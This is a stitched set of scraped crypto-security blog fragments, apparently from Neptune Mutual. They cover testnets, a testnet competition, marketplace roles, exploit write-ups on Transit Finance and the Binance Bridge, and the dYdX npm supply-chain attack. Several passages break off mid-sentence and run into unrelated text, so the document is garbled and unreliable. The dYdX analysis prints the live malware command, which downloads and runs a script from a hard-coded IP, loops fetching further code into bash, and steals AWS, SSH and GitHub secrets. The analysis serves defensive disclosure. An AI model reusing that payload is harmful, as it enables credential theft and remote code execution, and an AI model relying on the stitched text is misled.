        html: "<p><strong>Blockchain testnets are essential tools in the development and deployment of decentralized projects and cryptocurrencies. Testnets enable teams to deploy their protocols in a risk free environment in which users can provide valuable independent feedback and teams can check to see if their code functions as intended.</strong></p><p><strong>In this quick guide, we’ll be leveraging our inside experience as a protocol developer that has gone through two testnet deployments within the last few months, to demystify testnets and give some insight into why they are so crucial to the success of the blockchain ecosystem.</strong></p><h2 id=\"what-is-a-testnet\">What is a Testnet?</h2><p>From the name alone, you can guess that it is an environment where you can <em><strong>test</strong></em> a <em><strong>network</strong></em>. A testnet is a parallel network designed exclusively for testing purposes.</p><p>As every good developer knows, code must undergo rigorous testing before it can be deployed for public use. But these tests must be performed in an environment that mimics the conditions of the main network (mainnet) in order to yield meaningful results. That’s where testnets come in.</p><p>These test networks act and perform similarly to their respective mainnets, but they operate on separate ledgers and are completely independent from the mainnet.</p><p>This allows developers to freely and extensively test their applications and tokens on a functioning blockchain without having to worry about gas fees and loss of valuable coins.</p><h2 id=\"why-are-testnets-important\">Why are testnets important?</h2><p>There are several reasons why testnets are every developer’s friend. These include:</p><h3 id=\"lower-costs\">Lower Costs</h3><p>When a developer is building a token or decentralized application (dApp), they want to be certain that it functions as intended before they deploy it on the mainnet. Running tests directly on the mainnet can be expensive, especially when gas fees are at their highest.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/ethereum-average-gas-fee.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"974\" height=\"305\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/ethereum-average-gas-fee.png 600w, https://blog.neptunemutual.com/content/images/2022/11/ethereum-average-gas-fee.png 974w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Chart showing YTD Ethereum average gas fees | Source: <a href=\"https://ycharts.com/indicators/ethereum_average_gas_price\">ycharts.com</a></figcaption></figure><p>Can you imagine having to pay a network fee every time you run simple user tests? The costs can run into thousands of dollars worth of gas fees.</p><p>With testnets, you don’t have to worry about gas fees since you can get a limitless supply of native test tokens. Keep in mind that these test tokens can only be used on their respective testnets.</p><h3 id=\"avoid-disruptions\">Avoid Disruptions</h3><p>If developers tested their applications on the mainnet, every test or new update can disrupt the entire network, along with its users’ assets and transactions.</p><h3 id=\"quality-assurance\">Quality Assurance</h3><p>In addition to providing valuable testing infrastructure for developers, testnets also help with quality assurance. Using a testnet provides access to real user actions that can be useful for setting quality standards.</p><p>It's really only by allowing users to interact with a dApp that a developer can receive sufficient independent feedback on the user interface design. And in product design it's no secret that a clear and attractive UI is crucial to adoption and growth.</p><h3 id=\"security\">Security</h3><p>Testing your project on mainnet means exposing it to the same security risks that live projects have to deal with every day. Using a testnet offers the benefit of investigating any vulnerabilities in your dApp in a risk-free environment.</p><h3 id=\"community-building\">Community Building</h3><p>Testnets enable developers to begin building a community around their projects even before launching on the mainnet.</p><p>Trust is an essential aspect of community development, and what better way to establish trust than to show exactly what you’re working on and allow people to actively participate in evaluating and improving it?</p><p>At Neptune Mutual, for example, we recently launched our second testnet for our parametric cover protocol, this time on the <a href=\"https://test.neptunemutual.com/\">Fuji-Avalanche network</a>, and we already have a growing community across various social channels.</p><h2 id=\"how-are-testnets-different-from-mainnets\">How are Testnets Different from Mainnets?</h2><p>Though they are almost identical in so many ways, testnets and mainnets have a number of fundamental differences.</p><h3 id=\"incompatibility\">Incompatibility</h3><p>Tokens, and other digital assets, deployed on a testnet cannot be used on the project’s mainnet version, and vice versa. In this way, testnets operate the same way as mainnets, but the actions on one cannot impact the other. For example, you cannot transfer ether (ETH) into any of Ethereum’s testnets. In the same way, you cannot transfer the native ERC-20 token of a testnet to use on the Ethereum blockchain.</p><h3 id=\"faucets\">Faucets</h3><p>For the uninitiated, <a href=\"https://101blockchains.com/top-crypto-faucets/\">faucets</a> are web applications that give out crypto rewards to users for completing tasks. Because testnets and mainnets operate on separate tracks, they each have their own faucets. Naturally, this means they both have different  wallet networks.</p><p>Additionally, the algorithm that regulates the release of testnet tokens strips the tokens of any economical benefit within and outside the testnet blockchain.</p><h3 id=\"distinct-network-ids\">Distinct Network IDs</h3><p>Testnets often have unique Network IDs that immediately make them stand out the mainnet and other testnet platforms.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/evm-networks-chainid.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"2000\" height=\"936\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/evm-networks-chainid.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/evm-networks-chainid.png 1000w, https://blog.neptunemutual.com/content/images/size/w1600/2022/11/evm-networks-chainid.png 1600w, https://blog.neptunemutual.com/content/images/size/w2400/2022/11/evm-networks-chainid.png 2400w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Table showing the unique network IDs for the Ethereum mainnet and testnets</figcaption></figure><p>These IDs are used to ensure that smart contracts are deployed to the correct testnet environment and that the correct wallet systems are used.</p><h3 id=\"transaction-frequency\">Transaction Frequency</h3><p>Mainnets typically record much higher numbers than testnets when it comes to transaction frequency.</p><p>The main technical by</p><p>elements of testnets and mainnets are the same. This is essential because it provides the assurance that if something works correctly on the testnet, then it will also work correctly on the mainnet.</p><h2 id=\"most-popular-testnets\">Most Popular Testnets</h2><p>There are several testnets available, but the most popular ones are:</p><h3 id=\"ropsten-ethereum\">Ropsten (Ethereum)</h3><p>The Ropsten Testnet Explorer is the most used Ethereum testnet. It was launched in 2016 with over 10M ERC-20 testnet tokens deployed. Developers can view Ropsten’s testnet transactions on <a href=\"https://ropsten.etherscan.io/\">Etherscan</a>. They can also add Ropsten ETH to their testnet wallets using <a href=\"https://ropsten.oregonctf.org/\">dedicated Ropsten faucets</a>. The Ropsten network was deprecated following the <a href=\"https://ethereum.org/en/upgrades/merge/\">Ethereum network’s switch</a> from a Proof of Work to a Proof of Stake in September 2022.</p><p><strong>Mumbai Network (Polygon)</strong></p><p>The Mumbai Testnet provides a near-replica testing environment of the Polygon blockchain.

Nearly 33 million people have voted in support of the proposition, the majority of which were probably spoils from the heist from the attacker themselves.</p><h2 id=\"how-to-prevent-such-an-attack-vector\">How to prevent such an attack vector</h2><p>The attack is down to an economic design flaw.

This vulnerability may have been caused by a flaw in the way the Binance Bridge verified proofs, which might have allowed attackers to forge arbitrary messages. The BNB Chain Team reported that the vulnerability was exploited by forging a low-level proof into a single shared library. As per the disclosed reports, the magnitude of the attack is expected to be far less, with the perpetrator stealing between $100 and $110 million in stolen funds due to the extensive involvement and quick response of community, internal, and external security partners.

The exploit was carried out due to an external call to the callTokensToSend function. The developer put their system on maintenance to avoid further losses. So far, half of the funds have been recovered, and any further losses will be fully compensated by the Treasury.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h2><p>Dapper Labs' previously announced NFT platform based on the LaLiga Spanish soccer league will launch in closed beta later this month, following in the footsteps of NBA Top Shot and NFL All Day.

Golazos is Spanish for spectacular goal, and LaLiga Golazos will sell bilingual NFTs with play-by-play narration, player performance details, and match statistics in both English and Spanish. LaLiga Golazos will sell NFT collectibles minted on Dapper's Flow blockchain, with video highlights transformed into trading card-like assets that can then be sold and traded.</p><p>Athletes are among the most popular celebrities who have joined web3 and the ongoing shift to NFTs by releasing their own digital collectibles.

The bottom-most nodes are called leaves.</p>\n</li>\n<li>\n<p>There are as many leaves as the number of data that need to be hashed, and the nodes between the leaves and the root are determined by the hash of the concatenated hashes of the nodes below it.</p>\n</li>\n<li>\n<p>In the case of Binance Bridge, when we verify an IAVL tree, it expects two operations, an iavl:v operation, and a multistore operation.</p>\n</li>\n</ol>\n<!--kg-card-end: markdown--><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/bsc-multi-storage.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"661\" height=\"441\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/bsc-multi-storage.png 600w, https://blog.neptunemutual.com/content/images/2022/11/bsc-multi-storage.png 661w\"></figure><!--kg-card-begin: markdown--><ol start=\"8\">\n<li>\n<p>In order to forge a proof, we need both operations to succeed, and we need the multistore operation to return a fixed value, which is the hash of the specified block, 110217401.</p>\n</li>\n<li>\n<p>As per the implemented codebase, it is seen that the root hash is difficult to be manipulated.

        html: "<h2 id=\"tldr\">TL;DR</h2><p>On October 2nd, 2022, Transit Finance lost $21 million after a vulnerability in their code-base allowed a hacker to drain the wallets of users who had approved the protocol's swap contract.</p><h2 id=\"introduction-to-transit-finance\">Introduction to Transit Finance</h2><p>Transit Finance is a multi-chain DEX aggregator that chooses and combines popular DEXs from public chains to improve transaction depth and yields.</p><h2 id=\"vulnerability-assessment\">Vulnerability Assessment</h2><p>The vulnerability existed in the project's code, but the attacker specifically targeted users by exploiting a weakness in the transferFrom function. The Transit Swap protocol did not strictly validate the data sent in by the user during token exchange, resulting in an arbitrary external call that the hacker exploited to steal approved tokens from users.<br></p><p>Any tokens approved for trading on Transit Swap could be sent directly from the user's wallet to the address of the exploiter.</p><h2 id=\"steps\">Steps</h2><ol><li>The smart contracts of the project are closed-source contracts. The published byte-code was decompiled to determine that the underlying cause of this vulnerability was a controllable transferFrom external call.<br></li><li>The first attack <a href=\"https://etherscan.io/tx/0xba75ad7a43e784f51fe777d749fc55ae10f1df2bcb01cde97641613b19acb6ec\" rel=\"nofollow noopener noreferrer\">transaction</a> by the <a href=\"https://etherscan.io/address/0x75f2aba6a44580d7be2c4e42885d4a1917bffd46\" rel=\"nofollow noopener noreferrer\">exploiter</a> lasted around thirty minutes until tokens were exchanged for ETH and BNB on the respective chains. The exploited transaction to drain all the funds can be seen in thorugh <a href=\"https://etherscan.io/tx/0x743e4ee2c478300ac768fdba415eb4a23ae66981c076f9bff946c0bf530be0c7\" rel=\"nofollow noopener noreferrer\">this Etherscan details</a>. <br></li><li>When a user initiates a swap through Transit Swap, they initially pass through the routing proxy contract. Different contracts for routing bridges are selected based on the type of exchange.<br></li><li>The routing bridge contract will transmit the claimTokens function of the permissions management contract, which requires user authorization prior to token exchange. The claimTokens function then transfers the tokens to the routing bridge contract to be redeemed by the user.<br></li><li>The claimTokens function transfers funds by running the transferFrom function of the specified token contract. The parameters are unconstrained, except that the caller must be either a routing proxy contract or a routing bridge contract, and passed in by the upper-layer routing bridge contract.<br></li><li>After receiving the tokens to be exchanged by a user, the route bridge contract will then invoke the swap contract for specified swap operations. The address of the swap contract and the call data are all established by the upper-layer route proxy contract; therefore, the route bridge contract does not validate the the parsed swap contract address and call data.<br></li><li>The parameters sent by the route proxy contract to the route bridge contract likewise originate from the user-supplied parameters. The route proxy contract verifies just that the length of each data in the user-supplied calldata meets the expectations and that the called route bridge contract is the address in the whitelist mapping, but does not examine the calldata itself.<br></li><li>The attacker exploited the fact that neither the routing proxy contract, the routing bridge contract, nor the permissions management contract inspects incoming data.<br></li><li>With the constructed data from the routing proxy contract, the callBytes function of the routing bridge contract is invoked. The callBytes function decodes the attacker's exchange contract and redemption data, where the exchange contract is the address of the permissions management contract and the redemption data is a call to the claimTokens function.<br></li><li>The claimTokens function is then used to transmit the tokens of the selected user to the token address of the attacker. This is accomplished by stealing tokens from all authorized users of the permissions management contract.</li></ol><h2 id=\"aftermath\">Aftermath</h2><p>The hacker has returned over 83% of the stolen assets after the involvement of multiple security firms.<br></p><p>The project team continued to collect specific data from stolen users in order to develop a return plan for those affected by this incident.</p><h2 id=\"how-to-prevent-such-an-attack-vector\">How to prevent such an attack vector</h2><p>Hiding contract code makes lengthy investigation practically impossible and impedes hackers' ability to find vulnerabilities before they are exploited. Each protocol must take the appropriate procedures to include all validated contracts into its operations.<br></p><p>Hacks, exploits, frauds, and smart contract vulnerabilities are all too common in the blockchain world, and a DeFi team's requirement to keep closed source code raises a lot of suspicion. Is this an insider job involving the use of privileged information against their users for yet another form of business marketing?

        html: "<p>We're pleased to announce that on <strong>Saturday, October 8, 2022 at 11:30am UTC</strong>, we'll be running a Gleam competition to launch our marketplace on the Fuji Avalanche testnet. This follows months of intensive security reviews and final optimisation of the UI, along with the introduction of a major new feature. The competition will last for three weeks, closing at 11:30am UTC on Saturday 29th October.<br></p><p>There will be prizes for more than 100 winners once again! This time, winners will receive not only future NPM tokens but also one of the brand new Neptune Mutual collectible NFTs! Users who want to compete are encouraged to join the Neptune Mutual Discord channel for the most up-to-date information on the testnet competition as well as the NFT series.<br></p><p>To encourage user participation, we will re-run our <a href=\"https://leaderboard.neptunemutual.com/\" rel=\"follow\">Hall of Fame dashboard</a>, which monitors user activity in the marketplace and awards points accordingly.<br></p><p>We've made a few changes to our parametric marketplace, so this testnet launch is a little different from our <a href=\"https://blog.neptunemutual.com/neptune-mutual-testnet-is-live/\" rel=\"follow\">1st testnet launch</a> as we are now keen to get feedback on the addition of the major new feature: <a href=\"https://blog.neptunemutual.com/diversified-cover-pools-increase-the-options-available-to-liquidity-providers-and-cover-purchasers-alike-is-this-the-route-to-scaling-adoption-of-digital-asset-cover-protection/\" rel=\"follow\">Diversified Cover Pools</a>. Another change is that we are running it on the Avalanche Fuji testnet (as opposed to the Polygon Mumbai testnet we used for our first tesnet trialà); we look forward to introducing Avalanche users and projects to the advantages of parametric cover, and of course welcoming all to our Neptunite community on Twitter and in Discord.</p><h2 id=\"brand-new-diversified-cover-pools\">Brand new! Diversified Cover Pools</h2><p>A <a href=\"https://blog.neptunemutual.com/diversified-cover-pools-increase-the-options-available-to-liquidity-providers-and-cover-purchasers-alike-is-this-the-route-to-scaling-adoption-of-digital-asset-cover-protection/\" rel=\"follow\">Diversified Cover Pool</a> provides liquidity to a portfolio of cover products; each cover product relates to a specific project and has its own card in the marketplace. Each cover product has its own specific cover policy trigger parameters, and if an incident arises, then all the policyholders of that specific cover product are paid out from the diversified pool. In this way, partial payouts of liquidity are possible from a diversified cover pool in the sense that each cover product is allocated only a portion of the total liquidity of the diversified pool.<br></p><h3 id=\"good-for-cover-purchasers-great-for-liquidity-providers\">Good for Cover Purchasers, Great for Liquidity Providers</h3><p>Much of the narrative around cover protocols is aimed at cover policy purchasers. This is understandable as the prime objective of cover protocols, whatever their approach, is to mitigate the risk of users against some form of risk. In order to achieve this goal, it is a fundamental requirement that cover protocols source capital that can be used for underwriting the risks of cover policy holders, and this is where it is important to consider the needs and interests of those providing the underwriting capital. &nbsp;Diversified pools, as the name suggests, are a parametric pool in which the underwriting risks that LPs are exposed to are diversified amongst a portfolio of cover products. This opens up the opportunity to leverage underwriting capital to provide better returns to LPs so that low risk projects can be grouped together in a way that satisfies both the return needs of the LPs as well as the low premiums expected by cover purchasers of low risk projects. Diversified Pools are therefore good for Cover Purchasers because it opens up the opportunity for parametric policies to be created for a much wider variety of low risk projects that would have been difficult to source underwriting capital with the Dedicated Cover Pool model. &nbsp;Diversified Pools are great for liquidity providers, because of the potential to generate leveraged returns for a diversified set of cover products. &nbsp;<a href=\"https://blog.neptunemutual.com/diversified-cover-pools-increase-the-options-available-to-liquidity-providers-and-cover-purchasers-alike-is-this-the-route-to-scaling-adoption-of-digital-asset-cover-protection/\" rel=\"follow\">Understanding exactly how underwriting capital works</a> is a vital part of understanding the <a href=\"https://blog.neptunemutual.com/the-neptune-mutual-ecosystem/\" rel=\"follow\">Neptune Mutual Ecosystem</a>, and this is why we have written about both these topics in our <a href=\"https://blog.neptunemutual.com/tag/blog/\" rel=\"follow\">blog</a>.<br></p><h3 id=\"create-%E2%86%92-test-%E2%86%92-learn-%E2%86%92-repeat\">Create → Test → Learn → Repeat</h3><p>The main goal of the second testnet competition is to get feedback from users on this new type of parametric pool and other changes we have made. For this reason, users can earn bonus points in the testnet competition by reporting bugs or by making suggestions on how the application could be made better to provide an outstanding user experience.<br></p><p>Our <a href=\"https://discord.gg/2qMGTtJtnW\" rel=\"nofollow noopener noreferrer\">Discord</a> channel is very active and is the ideal place to keep up-to-date with the activity associated with our testnet2 competition.

The competition will run through to October 29th, and will reward over 100 successful participants with amazing rewards. &nbsp;This time rewards for winners will include an allocation of future NPM tokens and, new for testnet2, an allocation of some of our brand new NFTs.</p><p>Mainnet is launching soon! That’s right, the Neptune Mutual protocol is expected to go live later this year. Our engineering team has been hard at work, finalizing everything for our mainnet protocol, and we’re nearly ready for our users to begin accessing parametric digital asset protection.</p><p>We’ll keep you updated and publish an official statement as soon as we are in a position to share details of the mainnet launch.</p><h2 id="blog-digest">Blog Digest</h2><p>As part of our commitment to keeping our community up-to-date on security issues affecting the blockchain industry, we created the Exploit Analysis blog category that looks at decoding the hacks and exploits that impacted blockchain projects over the course of the month. For September, we broke down GMX’s Price Manipulation exploit, Omni Bridge’s Call Data Replay exploit, and Wintermute’s Hot Wallet compromise. Check them all out <a href="https://blog.neptunemutual.com/tag/exploit-analysis/" rel="follow">here</a>.</p><p>In our blog post <a href="https://blog.neptunemutual.com/how-to-safeguard-against-malicious-websites/" rel="follow">How to Safeguard Against Malicious Websites</a>, we looked at the most common platform-based attacks, including DNS spoofing, DNS Tunneling, and NX-Domain Attack, as well as how Web 3 users can avoid falling victim.</p><p>Parametric cover is a new approach to digital asset protection that is very different from the discretionary approach used by a number of protocols to compensate for individual loss. This is why we’re sure you’ll find our blog on <a href="https://blog.neptunemutual.com/how-are-discretionary-and-parametric-covers-different/" rel="follow">How Discretionary and Parametric Covers are Different</a> interesting. Parametric cover policies available in the Neptune Mutual marketplace help streamline the process of claims and payouts in the blockchain space. They eliminate the need for individual loss assessment allowing for quicker, more reliable payouts in the event of a predetermined hack incident. Not only is this approach more efficient and scalable, but it can also provide income earning opportunities for key stakeholders.</p><p>Lastly, our blog post <a href="https://blog.neptunemutual.com/unpacking-the-basics-of-the-metaverse/" rel="follow">Unpacking the Basics of the Metaverse</a> looks at what the Metaverse is all about, including current developments, risks, assets, and growth opportunities.

However, an anonymous hacker exploited a vulnerability in the bots' arbitrage contract code, and stole not only the recently acquired 800 ETH, but the entire 1,101 ETH in 0xbad’s wallet, amounting to approximately $1.5 million.<br></p><p>BXH was the victim of another flash loan attack in which the contract lost 40,085 $USDT, with the attacker making a profit of 31,794 $USDT after paying off the flash loan fee. The team had most recently updated their TokenStakingPoolDelegate contract following their earlier loss of $2.5 million due to a compromised private key. The getReverse function of the contract's getITokenBonusAmount function was utilized in the flash loan attack to retrieve the instantaneous quotation, which the attacker then manipulated to obtain his share of the rewards.<br></p><p>A hacker exploited an internal bug in a swap contract, causing Transit Swap, a multichain decentralized exchange aggregator, to lose approximately $21 million. According to reports, the attack was the result of a compatibility problem or a misplaced trust in the swap contract. Following the disclosure, Transit Swap apologized to users, and efforts are currently underway to locate and recover the stolen funds. The team collaborated with multiple security firms to track down and communicate with the hacker, resulting in the return of nearly 70% of the stolen funds.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h2><p>Warner Music Group (WMG) has announced a collaboration with NFT marketplace OpenSea to create a venue for select musical artists to build and expand their fanbase into the Web3 community. The collaboration between these two entities will provide selected WMG artists with early access to OpenSea's newly launched feature, which enables artists to launch their NFT collections and limited-edition projects on their own customizable and dedicated drop pages. These WMG artists will have access to personalized storytelling on customized landing pages, as well as industry-leading safety and security features from OpenSea. The collaboration intends to introduce existing fan communities on OpenSea to new forms of connection and creativity through NFTs, as well as to provide new opportunities for fans to interact with music and artists within the Web3 community.</p><p>Meta, the parent company of both Facebook and Instagram, announced a new step in its digital arts initiative. Now, all users on both platforms can connect their wallets and share NFTs in 100 countries. As part of the feature, which has been in testing since May, users will be able to tag creators and collectors and cross-post digital collectibles between platforms without having to pay any fees.</p><p>Walmart has taken its first foray into the Metaverse with the release of Walmart Land and Walmart’s Universe of Play on Roblox. The focus of Walmart Land is on immersive experiences, with highlights including a Ferris wheel that defies the laws of physics, unlockable tokens and badges, an interactive piano walkway, and a D.J. booth for users. The virtual world will also include products from Lottie London, Bubble, UOMA by Sharon C, and other brands, as well as a store of virtual merchandise, or verch for user avatars. Electric Fest, a motion-capture concert featuring YUNGBLUD, Madison Beer, and Kane Brown, will be added to Walmart Land in October.</p><p>In honor of the 47th anniversary of Muhammad Ali's landmark \"Thrilla in Manila\" fight, the first set of playable avatar boxers in an Artificial Intelligence metaverse boxing game titled Muhammad Ali - The Next Legends was released. Altered State Machine (ASM), Non-Fungible Labs (NFL), and Muhammad Ali Enterprises (MAE) were the stakeholders behind the project. The boxing avatars' initial release included a drop of the limited-edition Pro Pack bundle. Users who purchased one of these Pro Packs were automatically upgraded beyond the beginner level. To clarify, the first two avatars are Rookie, which can be obtained with an unlimited mint, and Pro, available with a Pro Pack mint. Then, Champ and Legend will become available as the level increases.</p><p>OneFootball, one of the leading sports platforms, has launched a new NFT drop in conjunction with Serie A. This drop featured 108 outstanding football moments from Serie A matchdays 2, 3, and 4 of the current season. This includes assists, saves, and even goals from SSC Napoli, A.C. Milan, and Juventus.

        html: '<p>Neptune Mutual is a marketplace for parametric cover policies. In this blog we thought we would describe the different actors of the Neptune Mutual ecosystem that interact with the marketplace.</p><h2 id="neptune-mutual">Neptune Mutual</h2><p>Neptune Mutual is the project name of the marketplace. The Neptune Mutual team works for a technology development company that has created the frontend application and corresponding smart contracts that enable the functioning of the marketplace.  The Neptune Mutual development company does not create its own cover pools, sell cover policies, and it does not provide any liquidity to any of the cover pools in the Neptune Mutual marketplace.</p><h2 id="neptune-mutual-association">Neptune Mutual Association</h2><p>The marketplace is moderated and operated by an association, called<strong> Neptune Mutual Association</strong>, located in Zug, Switzerland.  <br></p><p>Neptune Mutual Association is a not-for-profit entity that does not participate in any commercial activity within the marketplace.  Its primary role is to moderate the marketplace, and in particular to oversee the correct operation of the event reporting and incident resolution process.  Note that the association is not a DAO, and is not, at least for the time being, decentralised.  That being said, the association has been set up as the first step towards decentralising the governance of the protocol.  The Chairman of Neptune Mutual Association is Hans Koning,  advisor to Neptune Mutual from day one (but not a co-founder).  <br></p><p>The role of the association is to intervene in exceptional circumstances in order to protect the integrity of the Neptune Mutual ecosystem.  By way of example, the governance committee has the power to pause the protocol (or the cover pool in question) in the event that the incident reporting process suffers a 51% attack.   The governance committee also has the power to perform emergency resolutions to reverse incident reporting decisions in the event of malicious activity.  It is not within the remit of the association to intervene in the normal course of the incident reporting process.<br></p><p>As the protocol develops over time the plan is to transfer more responsibility and powers to the Association such that it can eventually manage the operations of the marketplace completely as an autonomous entity.<br></p><h2 id="marketplace-actors">Marketplace Actors</h2><p>There are a number of different ways of interacting with the marketplace application that broadly speaking can be covered by the following categories of activity: cover creation, cover policy purchase, provision of liquidity (LP), reporting and resolution, and staking/bonding activity.</p><h3 id="cover-creators">Cover Creators</h3><p>It is expected that all cover creators will be incorporated companies, and, in most cases, they will be the company that has developed the blockchain project for which the dedicated cover pool, and the associated cover policy, is being developed to protect.  For diversified cover pools, cover creators will again be incorporated companies, and they may or may not be linked to the portfolio of projects that the diversified cover pool provides underwriting liquidity to.<br></p><p>The main point to note is that the Neptune Mutual team retains the right to determine whether an organisation can participate in the marketplace or not.  A variety of factors will be considered including the type of risks that the cover creator would like to design a policy to mitigate (in the first instance these should relate exclusively to security risks), and most particularly the Neptune Mutual team will pay particular attention to the security measures put in place to minimise security risks occurring.</p><h3 id="cover-purchasers">Cover Purchasers</h3><p>Once the marketplace launches on mainnet then anyone that fulfils the criteria of the terms and conditions of the marketplace can participate in purchasing a cover.  We encourage all users to read the terms and conditions carefully to ensure that you are not excluded by any of these terms.</p><h3 id="liquidity-providers">Liquidity Providers</h3><p>As the name suggests, liquidity providers provide liquidity to the two different types of cover pool that exist in the marketplace: dedicated or diversified.  As long as users conform to the terms and conditions of the marketplace, then any of the actors within the Neptune Mutual ecosystem can become liquidity providers.  Typically, we expect cover creators to inject the initial liquidity into their cover pools, and then provide a number of different incentives to encourage their respective communities to participate in providing liquidity as LPs.<br></p><h3 id="lending-protocols">Lending Protocols</h3><p>Cover pools in the Neptune Mutual marketplace supply a certain amount of “excess” liquidity to lending protocols, such as AAVE, in order to optimise the returns for liquidity providers.</p><h3 id="reporting-and-incident-resolution">Reporting and Incident Resolution</h3><p>An important feature of the Neptune Mutual protocol is the community-based reporting and incident resolution system.  This has been designed with careful consideration given to the incentive mechanism that encourages honest reporting of events through the use of staking of NPM tokens.  This is one of the key utility functions of the NPM token, and others are currently in development.</p><h3 id="proof-of-authority-pot-reporting-and-incident-resolution">Proof of Authority (PoT) reporting and incident resolution</h3><p>As additional utility of the NPM token is being developed, the marketplace application will launch before the NPM Token Generation Event (TGE).  This means that an interim reporting and incident resolution will be used until such time as NPM tokens are in circulation and NPM token holders are available to participate, as planned.  The interim reporting and incident resolution will be based on the existing model, albeit with PoT (proof of authority tokens) as opposed to NPM tokens.  PoT tokens will be held by a small and limited “community” and the process will be governed by the Neptune Mutual Association.<br></p><h3 id="stakingbonding-activity">Staking/bonding activity</h3><p>The staking and bonding features of the marketplace application depend upon the availability of NPM tokens.  These features will therefore not be available immediately at the mainnet launch, but will be activated following the TGE event.  As with other features of the marketplace, all actors will be able to participate and benefit from these features.</p><h3 id="strategic-partners">Strategic Partners</h3><p>Over and above the close collaboration with cover creators for dedicated and diversified cover pools, Neptune Mutual anticipates partnering with a certain number of external entities that can provide complementary services to the marketplace, such as, for example, reinsurance.<br></p><p>The first strategic partnership is with <strong>Cover Capital Ltd</strong>, a DeFi company specialised in the provision of liquidity to DeFi pools.   For cover creators that are looking to bootstrap liquidity for their cover pools, Neptune Mutual can connect them to Cover Capital Ltd who will review the specifics of the cover pool liquidity  opportunity.  Neptune Mutual is also working with Cover Capital Ltd in the expectation that Cover Capital Ltd may create and fund initial liquidity into a diversified cover pool for prime Dapps.</p><h2 id="neptunites">Neptunites</h2><p>We coined the term “Neptunites” to refer to our community of supporters across the different social media platforms that we use.   Neptune Mutual is acutely aware of the importance of fostering a healthy and engaged community.   There is a great deal of work to be done to increase the adoption of digital asset protection in the blockchain industry, and much of this work centres around encouraging users to learn about the challenging and technical subjects of blockchain security and the different ways of mitigating security risks when security is breached.  We owe a great deal to the efforts already made by our community in shaping the design of our application, and we intend to continue encouraging this engagement and help through a variety of means.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/11/neptune-mutual-ecosystem-1.png" class="kg-image" alt loading="lazy" width="1600"

        html: "<h2 id=\"tldr\">TL;DR</h2><p>On September 23, 2022, the npm (package manager for the JavaScript programming language) packages published by the cryptocurrency exchange dYdX, which directly relate to 44 other cryptocurrency projects, appeared to have been compromised. The packages in question were published by a member of the dYdX team using their personal npm account, which later turned out to contain malicious code that would execute information stealers on a system when installed.</p><h2 id=\"introduction-to-dydx\">Introduction to dYdX</h2><p>dYdX is a decentralized exchange platform that provides perpetual trading options for more than 35 cryptocurrencies, including Bitcoin (BTC) and Ether (ETH).</p><h2 id=\"vulnerability-assessment\">Vulnerability Assessment</h2><p>The root cause of the attack is due to the injection of a preinstall script that was able to download and execute a JavaScript file housed on a CDN.</p><h2 id=\"steps\">Steps</h2><p></p><ul><li>The following packages were published from the npm account of a dYdX employee:</li></ul><pre><code>@dydxprotocol/solo\nAffected versions: &gt;= 0.41.1, &lt;= 0.41.2\n\n@dydxprotocol/perpetual\nAffected versions: &gt;= 1.2.2, &lt;= 1.2.3</code></pre><ul><li>In the manifest file, a fake CDN site was utilized that could steal AWS IAM credentials, SSH keys, and GitHub tokens as soon as the package is deployed.</li><li>As viewed from <a href=\"https://my.diffend.io/npm/@dydxprotocol/solo/0.41.0/0.41.1\" rel=\"nofollow noopener noreferrer\">the supply chain monitoring platform</a>, this was achieved owing to a preinstall script that was able to download and execute the ci.js JavaScript file housed on api.circle-cdn.com.</li></ul><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/dydx-code.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1111\" height=\"425\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/dydx-code.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/dydx-code.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/dydx-code.png 1111w\" sizes=\"(min-width: 720px) 720px\"></figure><ul><li>The associated domain was recently registered on September 14th, according to available records.</li></ul><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/dydx-domain.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"924\" height=\"488\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/dydx-domain.png 600w, https://blog.neptunemutual.com/content/images/2022/11/dydx-domain.png 924w\" sizes=\"(min-width: 720px) 720px\"></figure><ul><li>The domain name and use of ci.js in the malicious file name suggest that the threat actor is attempting to replicate the CircleCI platform.</li><li>The ci.js script from compromised versions downloads and executes yet another Python script, setup.py, which contains the information-stealing code that exfiltrates the IAM credentials and other secrets from the victim's Amazon AWS instance.</li></ul><pre><code>curl http://206.189.197.24/setup.py --output 12345.py &gt;&gt; /dev/null 2&gt;&amp;1 &amp;&amp; python3 12345.py &amp;&amp; rm 12345.py &amp;&amp; if pgrep -f '206.189.197.24' &gt; /dev/null; then pkill -f '206.189.197.24'; fi &amp;&amp; (set +m; bash -c 'while sleep 10; do outtime=$(curl -s http://206.189.197.24/time.js); sleep $outtime; curl -s http://206.189.197.24/install.js | bash; done' &amp;) &gt;&gt; /dev/null 2&gt;&amp;1</code></pre><ul><li>The code also steals the user's GitHub tokens, SSH keys, environment variables, and external IP address.

If an attacker is able to gain write access to publish a newer version of the package, they will be able to inject malicious code into its newer releases. All the dependent projects that upgrade to this infected version are the first to be exploited.</p><p>Strict cyber hygiene must be practiced, and blockchain teams should adhere to a platform that monitors the libraries served within the organization.

